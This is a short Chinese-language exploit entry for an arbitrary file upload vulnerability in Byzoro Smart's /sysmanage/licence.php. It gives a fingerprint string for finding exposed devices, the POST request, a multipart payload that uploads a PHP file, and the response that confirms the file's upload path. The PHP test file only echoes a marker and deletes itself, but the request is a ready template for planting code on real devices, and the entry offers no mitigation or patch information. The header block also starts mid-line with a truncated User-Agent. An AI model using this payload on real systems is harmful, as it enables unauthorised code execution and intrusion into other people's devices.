# 百卓Smartlicence.php存在任意文件上传漏洞

百卓 ｜ 文件上传 ｜ —
- **指纹**：`app="byzoro-Smart"`
- **请求**：`POST /sysmanage/licence.php HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywnsogfin
------WebKitFormBoundarywnsogfin
Content-Disposition: form-data; name="mode"
set
------WebKitFormBoundarywnsogfin
Content-Disposition: form-data; name="ck"
radhttp
------WebKitFormBoundarywnsogfin
Content-Disposition: form-data; name="file_upload"; filename="test123.php"
<?php echo 'DudeSuite'; unlink(__FILE__); ?>
------WebKitFormBoundarywnsogfin--
```
- **响应特征**：200 上传定位：/home/upload/test123.php